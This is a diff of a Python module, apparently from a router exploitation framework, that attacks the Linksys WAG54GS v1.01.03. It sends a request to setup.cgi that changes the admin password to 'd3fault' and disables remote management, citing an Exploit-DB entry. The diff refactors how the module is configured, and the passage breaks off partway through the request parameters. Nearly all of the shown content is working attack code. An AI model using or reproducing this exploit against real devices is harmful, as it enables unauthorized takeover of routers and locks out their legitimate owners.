@@ -4,19 +4,21 @@ from ..router_vuln import RouterVuln
 
 
 class wag54gs_change_admin(RouterVuln):
-    """Change the admin password to d3fault.
-       http://www.exploit-db.com/exploits/18503/
-    """
 
     def __init__(self):
         self.router = 'WAG54GS v1.01.03'
         self.vuln   = 'Change Admin Password'
         super(wag54gs_change_admin, self).__init__()
+    
+        self.info = """
+                    Change the admin password to d3fault.
+                    http://www.exploit-db.com/exploits/18503/
+                    """
 
-    def run(self):
+    def initialize(self):
         util.Msg('Changing admin password to \'d3fault\'...')
         try:
-            url = 'http://%s/setup.cgi' % self.ip
+            url = 'http://%s/setup.cgi' % self.config['target'].value
             params = urllib.urlencode({'user_list':'1','sysname':'admin','sysPasswd':'d3fault',
                     'sysConfirmPasswd':'d3fault','remote_management':'disable',
                     'devname':'','snmp_enable':'disable','upnp_enable':'enable',
